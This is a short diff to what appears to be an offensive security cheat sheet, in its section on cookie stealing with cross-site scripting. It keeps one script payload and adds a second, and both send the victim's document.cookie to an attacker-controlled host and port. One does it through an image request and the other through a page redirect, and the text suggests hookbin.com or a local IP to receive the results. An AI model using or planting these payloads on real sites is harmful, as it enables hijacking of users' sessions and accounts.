@@ -143,8 +143,9 @@ document.write
 
 ### COOKIE STEALING WITH XSS
 > to steal a cookie a location to recieve the results is required, local ip or hookbin.com works well
-```javascript
+```html
 <script>var i=new Image;i.src="http://[IP OR DOMAIN : PORT]/?"+document.cookie;</script>
+<script>document.location='http://[IP OR DOMAIN : PORT]/?'+document.cookie;</script>
 ```
 
 ## LOCAL FILE INCLUSION (LFI)
